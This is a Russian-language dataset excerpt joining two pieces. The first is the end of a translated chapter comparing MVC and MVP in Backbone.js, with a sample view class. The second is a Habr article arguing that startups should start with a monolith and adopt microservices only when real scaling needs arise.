Как мы уже обсуждали, модели представляют данные приложения, в то время как представления – то, что пользователь видит на экране. Таким образом, MVC опирается на «Издатель»/«Подписчик» для некоторых своих основных коммуникаций (что, как ни странно, не рассматривается во многих статьях о шаблоне MVC). Когда модель изменяется, она уведомляет остальную часть приложения о том, что она была обновлена. Затем контроллер соответствующим образом обновляет представление. Задача наблюдателя в этих отношениях – облегчить присоединение нескольких представлений к одной и той же модели.
Для разработчиков, желающих узнать больше о несвязанной природе MVC (опять же, в зависимости от реализации), одна из целей шаблона – помочь определить отношения «один ко многим» между темой и ее наблюдателями. Когда тема изменяется, ее наблюдатели обновляются. У представлений и контроллеров немного иные отношения. Контроллеры облегчают отклик представления на различные действия пользователя и являются примером шаблона «Стратегия».
Резюме
Рассмотрев классический шаблон MVC, мы теперь должны понять, как он позволяет нам четко разделять задачи в приложении. Также теперь мы должны понимать, как фреймворки JavaScript MVC могут различаться в своей интерпретации шаблона MVC, который, хотя и довольно открыт для вариаций, по-прежнему разделяет некоторые фундаментальные концепции, предлагаемые исходным шаблоном.
При рассмотрении нового JavaScript-фреймворка MVC/MV* помните: может быть полезно сделать шаг назад и проанализировать выбранный подход к архитектуре (в частности, как он поддерживает реализацию моделей, представлений, контроллеров или других альтернатив), поскольку это может помочь вам лучше понять, как предполагается использовать фреймворк.
MVP
Модель-представление-презентер (Model-view-presenter, MVP) – это производная от шаблона проектирования MVC, которая фокусируется на улучшении логики представления. Она возникла в компании Taligent в начале 1990-х годов, когда они работали над моделью для среды C++ CommonPoint. Хотя и MVC, и MVP нацелены на разделение задач между несколькими компонентами, между ними есть некоторые фундаментальные различия.
В рамках данного обзора мы сосредоточимся на версии MVP, наиболее подходящей для веб-архитектур.
Модели, Представления и Презентеры
«P» в MVP означает презентера (presenter). Это компонент, который содержит бизнес-логику пользовательского интерфейса для представления. В отличие от MVC, вызовы из представления делегируются презентеру, который отделен от представления и вместо этого общается с ним через интерфейс. Это открывает нам доступ к множеству полезных вещей, таких, как имитация представления в модульных тестах.
Наиболее распространенной реализацией MVP является реализация, использующая пассивное представление (Passive View) (представление, которое по всем намерениям и целям «глупое»), содержащее немного или совсем не содержащее логики. Модели MVP почти идентичны моделям MVC и обрабатывают данные приложения. Презентер выступает в качестве посредника, который общается как с представлением, так и с моделью, однако оба они изолированы друг от друга. Презентеры эффективно связывают модели с представлениями, ответственность за которые ранее лежала на контроллерах в MVC. Они находятся в центре шаблона MVP и, как вы можете догадаться, включают в себя логику отображения (вслед за представлениями).
Запрошенные представлением, презентеры выполняют любую работу, связанную с пользовательскими запросами, и передают данные им обратно. Они извлекают данные, манипулируют ими и определяют, как данные должны отображаться в представлении. В некоторых реализациях презентер также взаимодействует с сервисным слоем для сохранения данных (моделей). Модели могут вызывать события, но роль презентера заключается в подписке на них, чтобы они могли обновлять представление. В этой пассивной архитектуре у нас нет концепции прямой привязки данных. Представления предлагают сеттеры, которые презентеры могут использовать для записи данных.
Преимущество такого изменения перед MVC заключается в том, что оно повышает тестируемость вашего приложения и обеспечивает более четкое разделение между представлением и моделью. Однако такой подход имеет свою цену: отсутствие поддержки привязки данных в шаблоне часто может означать необходимость решения этой задачи отдельно.
Хотя распространенная реализация пассивного представления (Passive View) заключается в том, что представление реализует интерфейс, существуют его вариации, включая использование событий, которые могут немного отделить представление от презентера. Поскольку в JavaScript нет конструкции интерфейса, мы используем здесь скорее протокол, чем настоящий интерфейс. Технически это все еще API, и с этой точки зрения, вероятно, справедливо называть его интерфейсом.
Есть также вариант MVP Надзирающий контроллер (Supervising Controller), который ближе к шаблонам MVC и MVVM, поскольку он обеспечивает привязку данных Модели непосредственно из Представления. Плагины наблюдения за ключами и значениями (Key-value observing, KVO) (например, плагин Дерика Бейли Backbone.ModelBinding) как правило, выводят Backbone из Пассивного Представления и др. и превращают его в Надзирающий контроллер или варианты MVVM.
MVP или MVC?
Обычно MVP чаще всего используется в корпоративных приложениях, где необходимо повторно использовать как можно больше логики представления. Для приложений с очень сложными представлениями и большим количеством взаимодействий с пользователем MVC может не совсем подходить, поскольку решение этой задачи может означать большую зависимость от нескольких контроллеров. В MVP вся эта сложная логика может быть инкапсулирована в презентере, что может значительно упростить обслуживание.
Поскольку представления MVP определяются через интерфейс, а интерфейс технически является единственной точкой пересечения системы и представления (кроме презентера), этот шаблон также позволяет разработчикам писать логику представления не дожидаясь, пока дизайнеры создадут макеты и графику для приложения.
В зависимости от реализации, MVP может быть проще для автоматического модульного тестирования, чем MVC. Причина, которую часто приводят в защиту этого, заключается в том, что презентер может использоваться как полная имитация пользовательского интерфейса, и поэтому его можно тестировать независимо от других компонентов. По моему опыту, все зависит от языков, на которых вы реализуете MVP (существует большая разница между выбором MVP для проекта JavaScript и, скажем, для ASP.net).
В конце концов, основные трудности, которые у вас могут быть с MVC, скорее всего, будут актуальны и для MVP, учитывая, что различия между ними в основном семантические. Пока вы четко разделяете задачи на модели, представления и контроллеры (или презентеры), вы получаете много одних и тех же преимуществ, независимо от выбранного вами шаблона.
MVC, MVP и Backbone.js
Существует очень мало, если вообще существует, архитектурных фреймворков JavaScript, которые заявляют о реализации шаблонов MVC или MVP в их классической форме, поскольку многие разработчики JavaScript не рассматривают MVC и MVP как взаимоисключающие (на самом деле мы с большей вероятностью увидим строго реализованный MVP, если посмотрим на веб-фреймворки, такие как ASP.net или GWT). Это связано с возможностью реализации в вашем приложении дополнительной логики презентера/представления, при этом оно будет считаться разновидностью MVC.
Один из азработчиков Backbone Ирен Рос (Irene Ros) (из бостонской компании Bocoup) придерживается такого подхода, поскольку, когда она разделяет представления на отдельные компоненты, ей нужно что-то, что могло бы их объединить. Это может быть как маршрут контроллера (например, Backbone.Router, который будет рассмотрен далее в книге), так и обратный вызов в ответе (response) на получение данных (fetch data).
Тем не менее, некоторые разработчики считают, что Backbone.js больше соответствует описанию MVP, чем MVC. Вот почему:
Презентер в MVP лучше описывает Backbone.View (слой между шаблонами представления и привязанными к нему данными), чем контроллер.
Модель соответствует Backbone.Model (она ничем не отличается от моделей в MVC).
Представления лучше всего представляют шаблоны (например, шаблоны разметки Handlebars/Mustache).
Ответить на это можно тем, что представление может быть просто Представлением (согласно MVC), поскольку Backbone достаточно гибок для его использования в различных целей. «V» в MVC и «P» в MVP могут быть реализованы с помощью Backbone.View, поскольку они способны решать две задачи: как рендеринг атомарных компонентов, так и сборку этих компонентов, рендеринг которых выполнен другими представлениями.
Мы также увидели, что в Backbone ответственность контроллера делится между Backbone.View и Backbone.Router, и в следующем примере мы можем фактически увидеть, что некоторые аспекты этого, безусловно, верны.
Наш PhotoView в Backbone использует шаблон Наблюдатель для «подписки» на изменения модели Представления в строке this.model.bind('change',...). Он также обрабатывает шаблоны в методе render(), но, в отличие от некоторых других реализаций, взаимодействие с пользователем также обрабатывается в Представлении (смотри events).
var PhotoView = Backbone.View.extend({

    //... is a list tag.
    tagName:  ""li"",

    // Pass the contents of the photo template through a templating
    // function, cache it for a single photo
    template: _.template($('#photo-template').html()),

    // The DOM events specific to an item.
    events: {
      ""click img"" : ""toggleViewed""
    },

    // The PhotoView listens for changes to 
    // its model, re-rendering. Since there's
    // a one-to-one correspondence between a 
    // **Photo** and a **PhotoView** in this
    // app, we set a direct reference on the model for convenience.

    initialize: function() {
      _.bindAll(this, 'render');
      this.model.bind('change', this.render);
      this.model.bind('destroy', this.remove);
    },

    // Re-render the photo entry
    render: function() {
      $(this.el).html(this.template(this.model.toJSON()));
      return this;
    },

    // Toggle the `""viewed""` state of the model.
    toggleViewed: function() {
      this.model.viewed();
    }

});
Другое (совсем иное) мнение состоит в том, что Backbone больше напоминает MVC Smalltalk-80, который мы рассматривали ранее.
Как ранее выразился постоянный пользователь Backbone Дерик Бейли, в конечном счете лучше не заставлять Backbone соответствовать каким-либо конкретным шаблонам проектирования. Шаблоны проектирования следует рассматривать как гибкие руководства по тому, как могут быть структурированы приложения, и в этом отношении Backbone не соответствует ни MVC, ни MVP. Вместо этого он заимствует некоторые лучшие концепции из множества архитектурных шаблонов и создает гибкую структуру, которая просто хорошо работает.
Однако стоит понять откуда и почему возникли эти концепции, поэтому я надеюсь, что мои объяснения MVC и MVP были полезны. Называйте это путь Backbone, MV* или как угодно, что поможет отразить его особенность архитектуры приложений. Большинство структурных JavaScript-фреймворков намеренно или случайно будут использовать свой собственный подход к классическим шаблонам, но важно то, что они помогают нам разрабатывать приложения, которые хорошо организованы, чисты и могут быть легко обслужены.
Краткие факты
Backbone.js
Основные компоненты: Модель, Вид, Коллекция, Маршрутизатор. Реализует свой собственный вариант MV*.
Более полная документация, чем у некоторых фреймворков (на момент написания статьи, например, Ember.js), а также множество улучшений в разработке.
Используется крупными компаниями, такими как SoundCloud и Foursquare, для создания нетривиальных приложений.
Событийно-управляемая связь между представлениями и моделями означает более полный контроль над тем, что происходит. Относительно просто добавить слушатели событий к любому атрибуту в модели, что означает больший контроль над тем, что изменяется в представлении.
Поддерживает привязку данных через ручные события или отдельную библиотеку наблюдения за ключами и значениями (KVO).
Отличная поддержка интерфейсов RESTful «из коробки», благодаря чему модели можно легко «привязать» к бэкэнду.
Обширная система событий. Очень просто добавить поддержку «Издатель»/«Подписчик» в Backbone.
Прототипы создаются с использованием ключевого слова «new», которое некоторым нравится.
Нет шаблонизатора по умолчанию, однако для этого часто используется микрошаблон Underscore. Также хорошо работает с решениями типа Handlebars.
Не поддерживает глубоко вложенные модели «из коробки», но, как и для многих распространенных проблем, существуют плагины Backbone, которые могут помочь. Например этот.
Понятные и гибкие соглашения для структурирования приложений. Backbone не навязывает использование всех своих компонентов и может работать только с теми, которые необходимы.
Чтобы продолжить, см. раздел «Основы Backbone».
Ссылки содержат Сравнение архитектурных шаблонов и полностью будут задокументированы в «Основах Backbone»."
"Издержки микросервисов, которые ваш стартап может не потянуть",https://habr.com/ru/companies/ruvds/articles/909548/,"Выживание стартапа зависит от того, насколько быстро вы сможете вносить доработки, поставлять новые функции и обеспечивать ценность для конечных потребителей. И во всём этом важную роль играет выбранн...","Выживание стартапа зависит от того, насколько быстро вы сможете вносить доработки, поставлять новые функции и обеспечивать ценность для конечных потребителей. И во всём этом важную роль играет выбранная вами базовая архитектура. Кроме того, оперативность команды напрямую зависит от технологического стека и используемого языка программирования. Неудачная архитектура, особенно на базе незрелых микросервисов, может сильно подорвать продуктивность и привести к срыву планов по выпуску продукта.

Я усвоил всё это, когда работал над новаторскими проектами в начинающих стартапах, где в качестве программной архитектуры выбирались сомнительные решения, которые вели к недоделанным сервисам и хрупким, перемудрёным локальным конфигурациям, а также подрывали дух разработчиков, которые не тянули излишнюю сложность.

Ну и прежде чем описывать подводные камни такого решения, уточню, на что конкретно вы подписываетесь, когда слишком рано переходите на микросервисы:

Слабое место Как проявляется Последствия для разработчика
Сложность развёртывания Необходимость оркестрировать более 5 сервисов для работы одной функции Лишние часы работы над каждым релизом
Хрупкость локальной разработки Расползание Docker, сломанные скрипты, платформо-зависимость Медленный онбординг, частые сбои
Дубликация CI/CD Несколько пайплайнов с повторяющейся логикой Дополнительная плата за каждый сервис
Связывание сервисов «Разделённые» сервисы, тесно связанные общим состоянием Медленное внесение изменений, дополнительные хлопоты по координации
Издержки наблюдаемости Распределённая трассировка, логирование, мониторинг Требуются недели для должной настройки всех инструментов
Фрагментация наборов тестов Тесты разбросаны по сервисам Ненадёжные тесты, низкая уверенность
Далее я расскажу, почему микросервисы на ранних этапах зачастую дают обратный эффект, когда они действительно помогают, и как структурировать системы стартапа для повышения скорости его роста и выживаемости.

▍ Монолит вам не враг


Если вы создаёте продукт SaaS, даже простая обёртка базы данных SQL в конечном итоге может привнести много внутренней сложности, связанной с её бизнес-логикой. Вы также можете прибегать к различным интеграциям и фоновым задачам, которые позволяют преобразовывать один набор данных в другой.

Со временем ваше приложение может обрасти ненужными функциями и стать беспорядочным. Монолиты же отличаются тем, что продолжают работать — даже в беспорядочном виде они позволяют команде акцентировать внимание на самом важном:

выживание;
создание ценности для клиента

Самое большое преимущество монолитов в простоте их развёртывания. Как правило, подобные проекты создаются на базе существующих фреймворков — это может быть Django для Python, ASP.Net для C#, Nest.js для Node.js и так далее. Придерживаясь монолитной архитектуры, вы получаете значительное преимущество перед вычурными микросервисами — обширную поддержку со стороны опенсорсного сообщества и мейнтейнеров проекта, которые изначально создавали эти фреймворки для обеспечения работы в виде единого процесса, монолитного приложения.

Расскажу одну историю. Как-то в стартапе, занимавшемся недвижимостью, я вёл команду фронтенда и периодически консультировал ребят из бэкенда в выборе технологий. Так вот, наше приложение создавалось на Laravel и претерпело интересную эволюцию. Начиналось оно с небольшой информационной таблицы для риелторов, но в итоге разрослось в куда более масштабную систему.

Со временем приложение превратилось в многофункциональный программный пакет, который обрабатывал сотни гигабайт документов и интегрировался с десятками сторонних сервисов. При этом он всё также опирался на откровенно простой стек PHP, функционирующий на сервере Apache.

Наша команда активно налегала на лучшие практики, рекомендованные сообществом Laravel. И это себя оправдало. Мы смогли значительно масштабировать возможности приложения, продолжая соответствовать задачам и ожиданиям бизнеса.

Интересно, что нам ни разу не пришлось разделять систему на микросервисы или применять более сложные паттерны инфраструктуры. Таким образом мы избежали большого объёма непредвиденной сложности. Простота архитектуры дала нам важный рычаг для решения задач. И это отражает опыт других людей. К примеру, в статье компании Basecamp «Majestic Monolith» авторы расписывают, почему на начальных этапах простота подобна суперсиле.

Люди нередко сетуют, что сложно делать монолиты масштабируемыми, но подобные сложности могут быть вызваны неудачной модульной структурой ПО.

Вывод: грамотно структурированный монолит позволяет команде сосредоточиться на поставке продукта, а не тушении «пожаров».

▍ Но разве микросервисы не являются «лучшей практикой»?

Многие инженеры сразу начинают с микросервисов, считая, что «это правильный путь». Да, при больших масштабах они помогают. Но в стартапе аналогичная сложность ведёт к торможению разработки. Микросервисы оправдывают себя, только когда у вас есть реальные узкие места, препятствующие масштабированию, большие команды или независимо развивающиеся направления.

А до этого? До этого вы платите всю ту же цену, но преимуществ не получаете. То есть та же дублирующаяся инфраструктура, хрупкие локальные конфиги и медленное внесение доработок. Например, компания Segment именно по этой причине в конечном итоге отыграла назад разделение на микросервисы — слишком много затрат при недостаточной ценности.

Вывод: микросервисы — это инструмент для масштабирования, а не стартовый шаблон.

▍ Когда микросервисы не к месту (особенно на ранних этапах)

В одной из начинающих команд, которую я консультировал, решение разделить сервисы создало больше хлопот по координации разных отделов, нежели принесло технической пользы.

Архитектура определяла не только форму кода, но также схему планирования, оценки и поставки продукта. Причём эти организационные издержки на первых порах легко упустить из виду, а потом становится слишком поздно.

Диаграмма: издержки координации растут линейно с количеством сервисов и экспоненциально при добавлении продакт-менеджеров, дедлайнов и несогласованных таймлайнов

Вот несколько наиболее распространённых анти-паттернов, которые могут просочиться в систему на ранних этапах.

▍ 1. Произвольные границы сервисов


В теории мы часто видим предложения разделять ПО на основе бизнес-логики — пользовательский сервис, сервис продукции, сервис заказов и так далее. Такой подход часто заимствуется из принципов предметно-ориентированного дизайна (Domain-Driven Design, DDD) или чистой архитектуры (Clean Architecture), которые имеют смысл в больших масштабах. В случае же начинающих продуктов, ещё не достигших стабильности и надёжности, они могут привести к преждевременному окостенению структуры.

В итоге вы получаете:

общие базы данных;
вызовы между сервисами в простых рабочих потоках;
связывание под видом «разделения».

Ещё в одном проекте я наблюдал, как команда разделила пользователя, аутентификацию и авторизацию в отдельные сервисы. Это усложнило развёртывание и затруднило координацию сервисов при любой операции API, какую бы разработчики ни создавали.

В реальности бизнес-логика не отображается непосредственно в границы сервиса. Преждевременное разделение может сделать систему более хрупкой и часто замедляет внесение изменений.

Вместо этого нужно точечно изолировать узкие места, опираясь на реальный план масштабирования, а не теоретическую элегантность.

Когда я обучал начинающие команды, мы иногда использовали для симуляции будущего разделения сервисов внутренние переключатели деплоев — не создавая операционных издержек. Это позволяло продакт-менеджерам и инженерам плавно исследовать границы возможностей, прежде чем фиксировать недостаточно зрелую инфраструктуру.

Вывод: разделяйте систему не по теории, а по фактическим узким местам.

▍ 2. Расползание репозитория и инфраструктуры

При разработке приложения обычно важно следующее:

согласованность стиля кода (линтинг);
инфраструктура тестирования, включая проверку интеграции;
конфигурация локальной среды;
документация;
конфигурация CI/CD.

При работе с микросервисами всё это нужно умножать на количество сервисов. Если ваш проект имеет структуру монолита, вы можете упростить себе жизнь, наладив централизованную конфигурацию CI/CD (при работе с GitHub Actions или GitLab CI). Некоторые команды разделяют микросервисы по разным репозиториям, что сильно усложняет сохранение согласованности кода и одинаковых конфигураций без привлечения дополнительных инструментов, а значит и усилий.


Для команды из трёх человек это перебор. Переключение между репозиториями и дополнительные инструменты увеличивают время разработки каждой функции.

▍ Устранение проблем за счёт использования единого репозитория и языка программирования

Исправить эту проблему можно по-разному. В молодых проектах самое важное — это хранить весь код в едином репозитории. Такой подход гарантирует присутствие в продакшене одной версии программы, а также упростит координацию код-ревью и взаимодействие внутри небольших команд.

В случае проектов Node.js я настоятельно рекомендую использовать инструмент nx или turborepo, так как они:

упрощают настройку CI/CD в подпроектах;
поддерживают кэширование сборки на основе графа зависимостей;
Позволяют рассматривать внутренние сервисы как библиотеки TypeScript (с помощью импортов ES6).

Эти инструменты экономят время, которое в противном случае тратится на связующий код или очередное продумывание оркестрации. Но есть у них и существенные недостатки:

сложные деревья зависимостей могут быстро разрастаться;
настройка производительности CI имеет свои особенности;
иногда для сокращения времени сборки требуется более быстрый инструментарий (например, bun).

Итак: инструменты вроде nx или turborepo в небольших командах повышают скорость работы с единым репозиторием — если только вы готовы вкладываться в поддержку их чистоты.

При разработке микросервисов на базе Go на ранних стадиях будет удобно трудиться в едином пространстве, используя директиву replace в go.mod. В конечном итоге по мере расширения ПО можно будет без лишних усилий выделить модули Go в отдельные репозитории.

Вывод: единый репозиторий с общей инфраструктурой экономит ваше время, а также обеспечивает согласованность и душевный покой.

▍ 3. Проблемы в локальной среде ведут к утрате скорости

Если для локального запуска вашего приложения требуется три часа, кастомный скрипт оболочки и марафон из контейнеров Docker, значит вы утратили скорость.

Молодые проекты часто страдают от:

недостатка документации;
устаревших зависимостей;
применения техник, опирающихся на конкретную ОС (например, конфигурации под Linux).

Из своего опыта могу сказать, что проекты, которые мне доставались от других команд, часто создавались под одну операционную систему. Некоторые разработчики предпочитали писать под macOS и никогда не озадачивались поддержкой своих скриптов оболочки под Windows. В командах, с которыми я сотрудничал, бывали инженеры, работавшие на машинах с Windows. И им часто приходилось переписывать скрипты оболочки или капитально перестраивать процесс налаживания работы локальной среды.

Со временем мы стандартизировали настройку среды для ОС разработчиков, чтобы уменьшить трения внутри команды. Это стало небольшим вложением, которое позволило сэкономить немало часов работы с приходом каждого нового инженера. Было нелегко, но мы осознали всю важность того, чтобы код запускался на ноутбуке любого нового разработчика, какую бы систему тот ни использовал.

Приведу пример ещё одного проекта, где инженер создал хрупкую конфигурацию микросервиса, который поток обработки контейнеров Docker смонтировал в локальную файловую систему. Естественно, когда ваш ПК работает под Linux, вы платите очень мало за выполнение процессов в виде контейнеров.

Но вот приход в команду нового фронтенд-разработчика, у которого на рабочем ноутбуке стояла Windows, привёл к кошмару. Ему приходилось запускать аж десять контейнеров, чтобы просто увидеть свой UI. При этом всё постоянно ломалось — то тома, то сеть, то проблемы с совместимостью контейнеров — и сама конфигурация была очень плохо задокументирована. Всё это создало немало трений в процессе онбординга.

В итоге мы вместе придумали прокси на Node.js, который имитировал конфигурацию nginx/Docker без контейнеров. Да, элегантности этому решению не хватало, зато оно позволило новому разработчику, наконец, включиться в общую работу.


Вывод: если ваше приложение работает только в одной ОС, то от провала продуктивности вас отделяет лишь один ноутбук.

Совет: в идеале старайтесь делать git clone <repo> && make up, чтобы проект запускался локально. Если это невозможно, необходимо вести актуальный файл README с инструкциями для Windows/macOS/Linux. Сегодня существуют языки программирования и наборы инструментов, которые плохо работают под Windows (например, OCaml), но популярный программный стек прекрасно себя чувствует в любой из распространённых операционных систем. Ограничение конфигурации лишь одной ОС зачастую говорит о недостаточном продумывании процесса разработки.

▍ 4. Несоответствие технологий

Помимо архитектуры, стек технологий также определяет степень болезненности микросервисов — не каждый язык хорошо дружит с этой архитектурой.

Node.js и Python: такая комбинация отлично подходит для быстрого внесения доработок, но усложняет управление сборкой артефактов, версиями зависимостей, а также обеспечение согласованности среды выполнения.
Go: компилируется в статические бинарные файлы, обеспечивает быструю сборку и низкие операционные издержки. Более гармонично подходит в случаях, когда требуется разделение.

Очень важно выбрать подходящий технологический стек с самого начала. Если вы ориентированы на быстродействие, обратите внимание на JVM с её экосистемой и возможностью масштабного развёртывания и выполнения артефактов в архитектурах на базе микросервисов. Если же вас интересует частое внесение доработок и оперативное прототипирование без масштабирования инфраструктуры развёртывания, то вполне подойдёт что-то вроде Python.

Довольно часто команды осознают, что выбрали совсем неподходящую технологию, которая изначально такой не казалась. В итоге им приходится вкладываться в переписывание бэкенда на другом языке (как в этом случае, когда инженерам пришлось выкручиваться из ситуации со старой кодовой базой на Python 2 и в итоге переносить её на Go).

С другой же стороны, если вам действительно это важно, можете соединить несколько языков программирования с помощью таких протоколов, как gRPC или асинхронного обмена сообщениями. И часто делают именно так.

Иногда вы подходите к точке, когда нужно расширить функциональность с привлечением машинного обучения или ETL-инструментов. В таком случае вы просто отдельно создаёте МО-инфраструктуру на Python, поскольку он имеет богатую экосистему предметно-ориентированных библиотек, которой не может похвастаться ни один другой язык. Но такие решения нужно принимать, когда в штате есть достаточно специалистов. В противном случае небольшая команда погрузится в пучину сложности совмещения нескольких программных стеков.

Вывод: сопоставляйте используемые технологии со своими возможностями, а не амбициями.

▍ 5. Скрытая сложность: коммуникация и мониторинг

Микросервисы несут с собой незримый набор потребностей:

обнаружение сервиса;
версионирование API;
повторы, защитные механизмы вроде circuit breaker и fallback;
распределённая трассировка;
централизованное логирование и предупреждение.

В монолите баг может раскрываться простой трассировкой стека. В распределённой же системе это подразумевает вопрос «Почему сервис А падает, когда развёртывание сервиса В отстаёт от развёртывания С на 30 секунд?» Здесь вам придётся прилично вложиться в набор технологий для наблюдаемости. Чтобы сделать всё «правильно», потребуется определённым образом снарядить ваше приложение. Это может подразумевать интеграцию OpenTelemetry для поддержки трассировки или привлечение инструментов облачного провайдера вроде AWS XRay, если вы реализуете крупную бессерверную систему. Но в этот момент вам придётся полностью сместить акцент с кода приложения на создание сложной инфраструктуры мониторинга, которая обеспечит уверенность в должном функционировании системы в продакшене.

Естественно, какие-то механизмы наблюдаемости нужно реализовывать и в монолитах, но в них всё это намного проще, нежели согласование подобных действий во множестве сервисов.

Совет: уясните, что распределённые системы требуют вложений, поэтому их использование влечёт за собой целый класс новых инженерных задач.

▍ Когда микросервисы оправданы

Несмотря на упомянутые сложности, в некоторых случаях разделение на уровне сервисов оказывается очень кстати. Это может быть:

Изоляция рабочей нагрузки: стандартным примером будет следование лучшим практикам AWS по использованию уведомлений S3 — когда изображение загружается в S3, активируется процесс изменения его размера/оптического распознавания символов и тому подобное. Польза в том, что это позволяет выделить непонятные библиотеки обработки данных в собственный изолированный сервис и закрепить за его API только обработку изображений и генерацию вывода на основе загруженных данных. В итоге вышестоящие клиенты, загружающие данные в S3, не будут связаны с этим сервисом, плюс уменьшатся издержки, связанные с его оснащением, так как он будет относительно прост.
Расходящиеся потребности в масштабировании: представьте, что создаёте ИИ-продукт. Одна из его частей (веб API), которая активирует рабочие нагрузки для модели МО и выдаёт результаты, не требует много ресурсов, так как взаимодействует в основном с базой данных. Но вот модель МО выполняется на GPU, является тяжеловесной и требует использования особых машин с поддержкой GPU и дополнительных настроек. Разделив эти части приложения в отдельные сервисы, работающие на разных машинах, вы сможете масштабировать их независимо.
Различные требования к среде выполнения: предположим, у вас есть легаси-код, написанный на C++. В таком случае перед вами 2 варианта — магически перевести его на язык основной программы или найти способы интегрировать его в неё. В зависимости от сложности легаси-приложения, вам может потребоваться писать связующий код, а также реализовывать дополнительные сетевые механизмы и протоколы для взаимодействия с этим сервисом. Но суть в том, что из-за несовместимости сред выполнения вам наверняка придётся выделить это приложение в отдельный сервис. Более того, вы также можете написать основное приложение на C++, но из-за различий в конфигурациях компилятора и зависимостях вам не удастся легко скомпилировать всё это вместе в едином исполняемом файле.

Крупные компании сталкивались с аналогичными проблемами. К примеру, команда разработки в Uber описала свой переход к предметно-ориентированной архитектуре микросервисов — и не из-за её теоретической чистоты, а в результате возникновения реальной сложности взаимодействия между командами и достижения пределов масштабирования. Их статья является хорошим примером того, как микросервисы могут работать, когда у вас достаточно зрелая организация, и есть достаточный операционный ресурс для их поддержки.

В одном проекте, который тоже касался работы с недвижимостью, нам от предыдущей команды достался код Python, который выполнял аналитику, загружая полученные данные в БД MS-SQL. В той ситуации мы поняли, что будет излишне затратно и бессмысленно создавать поверх такого механизма приложение на Django. В имевшемся коде использовались другие зависимости среды выполнения, и он был достаточно изолирован, поэтому мы держали его отдельно и возвращались к нему, только когда что-то шло не так. Такой подход сработал даже для нашей небольшой команды, поскольку этот сервис аналитики редко требовал изменений или обслуживания.

Вывод: используйте микросервисы при наличии расходящихся в своей сути рабочих процессов, а не просто, потому что они сулят чистоту.

▍ Практические советы для стартапов

Если вы готовите свой первый продукт, вот вам несколько рекомендаций:

Начинайте с монолита. Выберите распространённый фреймворк и сосредоточьтесь на реализации функциональности. Любого известного фреймворка с лихвой хватит для создания API или сайта и обслуживания пользователей. Не гонитесь за хайпом. Пусть это будет рутинный путь, зато впоследствии вы сами себе скажете «спасибо».
Один репозиторий. Не озадачивайтесь разделением кода на несколько репозиториев. Я работал с основателями компаний, которые хотели разделить репозиторий для уменьшения риска кражи подрядчиками их интеллектуальной собственности — обоснованное беспокойство. Но на практике это обеспечивало больше напряжения, нежели безопасности — замедление сборок, фрагментирование цикла CI/CD и слабая видимость процессов среди команд. В итоге такая неэффективная защита интеллектуальной собственности просто не стоила связанных с ней операционных хлопот, особенно притом, что внутри единого репозитория управляться с нужными механизмами доступа было проще. В начинающих проектах ясность и скорость важнее теоретического прироста безопасности.
Простейшая локальная конфигурация. Используйте make up. Если этого недостаточно, тщательно продумывайте все шаги, записывайте видео с экрана и добавляйте скриншоты. Если ваш код будет выполнять начинающий разработчик, он наверняка столкнётся с проблемой, и вам придётся объяснять, как её решить. Я на личном опыте понял, что документирование всех возможных проблем в каждой операционной системе избавляет от необходимости тратить время на объяснение, почему определённые моменты в локальном сеттинге не работают.
На начальных этапах вкладывайтесь в CI/CD. Даже если это простой HTML-код, который несложно скопировать (scp) на сервер вручную, этот процесс можно автоматизировать с помощью систем контроля версий и CI/CD. Когда конфигурация должным образом автоматизирована, вы просто забываете об инфраструктуре непрерывной интеграции и сосредотачиваетесь на функциональности. Я видел немало команд и основателей компаний, которые при работе со сторонними подрядчиками зачастую экономят на CI/CD, что приводит к негодованию разработчиков, которым надоедает деплоить всё вручную.
Разделяйте точечно. Разделяйте программу, только когда это точно решит острую проблему. В противном случае лучше вкладываться в модульность и тесты внутри монолита — это можно реализовать быстрее и легче.

Ну и самое главное: оптимизируйте систему под скорость разработки.

Скорость подобна кислороду для вашего стартапа. Преждевременное внедрение архитектуры микросервисов приводит к постепенной утечке этого кислорода, пока в конечном итоге стартап просто не задохнётся.

Вывод: начинайте с простого, придерживайтесь прагматичности и используйте разделение только при необходимости.

▍ Если вы склонитесь к микросервисам

Я сталкивался с проектами, которые переходили на микросервисы раньше, чем следовало бы, и вот несколько рекомендаций на подобный случай:

Оценивайте свой технологический стек, на который опирается архитектура микросервисов. Вкладывайтесь в развитие инструментов для разработчика. Когда вы разделяете проект на сервисы, вам приходится автоматизировать не только их стек, но также конфигурацию локальной и продакшен среды. В определённых проектах мне приходилось создавать отдельный CLI, который выполнял административные задачи в едином репозитории. В одном случае у нас было 15-20 микросервисов, и для локального деплоя мне пришлось создавать инструмент командной строки, чтобы тот динамически генерировал файлы docker-compose.yml, которые бы позволили обычному разработчику легко запускать программу одной командой.
Используйте надёжные протоколы коммуникации между сервисами. Если это асинхронный обмен сообщениями, проследите, чтобы их схемы были согласованы и стандартизованы. Если это REST, обратитесь к документации OpenAPI. В клиентах, отвечающих за межсервисную коммуникацию, нужно реализовать много нештатных операций: повторы с экспоненциальным увеличением периода ожидания, таймауты. Типичный голый клиент gRPC требует ручного налаживания всех этих дополнительных механизмов для исключения спорадических ошибок.
Проследите, чтобы ваша конфигурация модульных, интеграционных и сквозных тестов была стабильна и при дополнительных разделениях кодовой базы на отдельные сервисы хорошо масштабировалась.
В небольших проектах, где используется разделение на уровне микросервисов, для согласованной организации кода взаимодействия и механизмов наблюдения лучше задействовать общую библиотеку с типичными вспомогательными функциями. При этом важно сохранять минимальный размер этой библиотеки. Любое серьёзное изменение приведёт к повторной компиляции всех зависимых сервисов — даже если оно их не касается.

Налаживайте механизмы наблюдения на ранних этапах. Добавляйте структурированные логи JSON и создавайте соответствующие ID для отладки приложения после его развёртывания. Даже простейшие вспомогательные функции, выдающие богатую информацию для журналов (при условии снаряжения приложения правильными инструментами логирования/трассировки) часто экономят время, выявляя подозрительные пользовательские потоки.

Подытожим. Если вы всё равно собираетесь переходить на микросервисы, то должны заранее учитывать сопутствующие издержки в плане дополнительных усилий по развёртыванию и обслуживанию, необходимые для создания конфигурации, с которой сможет работать любой инженер в вашей команде.

Вывод: если вы решили перейти на сложную архитектуру, приложите усилия, чтобы сделать её управляемой.

▍ Заключение

Преждевременный переход на микросервисы приведёт к непосильным издержкам. Придерживайтесь простоты — она позволит вам оставаться на плаву — и прибегайте к разделению, только когда это уже явно необходимо.

Первым делом — выживание. Масштабирование потом. Используйте простейшую систему, которая работает, и оправдывайте каждый привносимый в неё уровень сложности.

Telegram-канал со скидками, розыгрышами призов и новостями IT 💻"
